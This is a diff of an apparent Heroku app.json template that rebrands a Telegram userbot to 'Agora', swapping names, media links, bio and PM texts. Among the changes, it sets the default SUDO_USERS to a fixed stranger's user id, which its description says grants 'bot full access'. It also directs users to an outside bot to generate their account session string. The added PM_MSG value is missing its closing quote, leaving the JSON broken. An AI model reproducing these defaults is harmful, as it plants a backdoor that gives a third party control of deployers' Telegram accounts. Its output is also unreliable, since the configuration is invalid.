@@ -1,5 +1,5 @@
 {
-  "name": "(AGORA USERBOT)",
+  "name": "𝐀𝖌𝖔𝖗𝖆 𝖀𝖘𝖊𝖗𝖇𝖔𝖙",
   "description": "𝙾𝙽𝙴 𝙾𝙵 𝚃𝙷𝙴 𝙱𝙴𝚂𝚃 𝚄𝚂𝙴𝚁𝙱𝙾𝚃 𝙸𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼 𝙿𝙻𝙰𝚃𝙵𝙾𝚁𝙼, 𝚂𝙿𝙴𝙲𝙸𝙰𝙻𝙻𝚈 𝙼𝙰𝙳𝙴 𝙱𝚈 𝙿𝚁𝙾𝙵𝙴𝚂𝚂𝙾𝚁 𝙰𝙶𝙾𝚁𝙰 𝚆𝙸𝚃𝙷 𝙰𝚃𝚃𝙸𝚃𝚄𝙳𝙴 𝙰𝙽𝙳 𝙷𝙰𝚁𝙳 𝙳𝙴𝙳𝙸𝙲𝙰𝚃𝙸𝙾𝙽 ... ❤ ",
   "logo": "https://te.legra.ph/file/2b577f871106d37276c41.jpg",
     "keywords": [
@@ -34,7 +34,7 @@
     },
     "YOUR_GROUP": {
       "description": "Set Ur Group Username",
-      "value": "@AGORA_SPAM_OFFICIAL",
+      "value": "@AGORA_USERBOT",
       "required": false
     },
     "YOUR_CHANNEL": {
@@ -54,22 +54,22 @@
     },
     "AWAKE_PIC": {
       "description": "Put here any telegraph media link for awake pic in .awake Or .pybot command.",
-      "value": "https://telegra.ph/file/f78f716654c404bfa2df7.jpg",
+      "value": "https://te.legra.ph/file/78a7494a15602979a9241.mp4",
       "required": true
     },
     "AGORA_PIC": {
-      "description": "Put here any telegraph media link for PYTHON pic in .op command.",
-      "value": "https://telegra.ph/file/f78f716654c404bfa2df7.jpg",
+      "description": "Put here any telegraph media link for AGORA pic in .op command.",
+      "value": "https://te.legra.ph/file/df85bdd7c6b0d0f190585.jpg",
       "required": true
     },
     "ALIVE_PIC": {
-      "description": "Put here any telegraph media link for alive pic in .pyalive Or .op command.",
-      "value": "https://telegra.ph/file/f78f716654c404bfa2df7.jpg",
+      "description": "Put here any telegraph media link for alive pic in .agora Or .op command.",
+      "value": "https://te.legra.ph/file/d3b1e726a3fb30f4e27a3.mp4",
       "required": false
     },
     "BIO_MSG": {
       "description": "Put Your Telegram Bio Here Required For Auto Bio.",
-      "value": "𝙸 𝚊𝚖 𝙻𝚎𝚐𝚎𝚗𝚍 ϐєϲαυѕє ι αм υѕєя οƒ ✞︎t͛ẞ̸ Pythonẞø✞︎ @Python_Userbot_Support_Pro",
+      "value": " 𝙸 𝙰𝙼 𝚂𝚃𝚄𝙳𝙴𝙽𝚃 𝙾𝙵 𝙿𝚁𝙾𝙵𝙴𝚂𝚂𝙾𝚁 𝙰𝙶𝙾𝚁𝙰 , 𝙱𝙴𝙲𝙰𝚄𝚂𝙴 𝙸 𝚄𝚂𝙴 𝙰𝙶𝙾𝚁𝙰 𝚄𝚂𝙴𝚁𝙱𝙾𝚃 @Agora_Userbot",
       "required": true
     },
     "PM_PIC": {
@@ -79,7 +79,7 @@
     },
     "PM_MSG": {
       "description": "Enter Your custom pm permit msg.",
-      "value": "нєℓℓο ѕιя / мιѕѕ,\nρℓєαѕє ∂οи'τ τяγ το ѕραм мγ мαѕτєя οτнєяωιѕє υ ωιℓℓ ϐℓοϲκє∂ ϐγ Pythonẞø✞︎ 🇮🇳.\nℑ ωιℓℓ яєρℓγ υ αƒτєя ϲοмє ϐαϲκ οиℓιиє,\nτнαиκγου!",
+      "value": "𝙷𝙴𝚈 , 𝙸 𝙰𝙼 𝙰𝚂𝚂𝙸𝚂𝚃𝙰𝙽𝚃 𝙾𝙵 {ALIVE_NAME} , 𝚂𝙾 𝙿𝙻𝙴𝙰𝚂𝙴 𝙳𝙾𝙽𝚃 𝚂𝙿𝙰𝙼 𝙷𝙴𝚁𝙴 𝙾𝚃𝙷𝙴𝚁𝚆𝙸𝚂𝙴 𝙹𝚄𝚂𝚃 𝚅𝙸𝚂𝙸𝚃 𝚃𝙷𝙴 @AGORABOT_INFO 𝚘𝚛 @AGORA_USERBOT 𝚘𝚛 @AGORA_SPAM_OFFICIAL 𝚃𝙷𝙰𝙽𝙺 𝚈𝙾𝚄
       "required": false
     },
     "MAX_FLOOD_IN_PM": {
@@ -98,7 +98,7 @@
     },
     "SUDO_USERS": {
       "description": "Enter your friends user id to to give him bot full access",
-      "value": "",
+      "value": "5090542427",
       "required": false
     },
     "SUDO_COMMAND_HAND_LER": {
@@ -131,8 +131,8 @@
        "description": "for login private messages create a private group and add @missrose_bot and do /id and add that id", 
        "value": ""
     }, 
-    "PYTHON_STRING": {
-      "description": "Get this value by running https://replit.com/@LEGEND-LX/PYTHONBOT-4#main.py ",
+    "AGORA_STRING": {
+      "description": "Get this value by running https://t.me/sessiongeneratorbot ",
       "value": ""
     },
     "HEROKU_API_KEY": {
@@ -180,12 +180,12 @@
     },
     "EMOJI_IN_HELP2": {
       "description": "Set The emojies You Want to Add In Help Command!!",
-      "value": "💫",
+      "value": "☘️",
       "required": false
     },
     "ALIVE_EMOJI": {
       "description": "Set The emojies You Want to Add In Help Command!!",
-      "value": "⚡",
+      "value": "☘️",
       "required": false
     },
     "PM_DATA": {
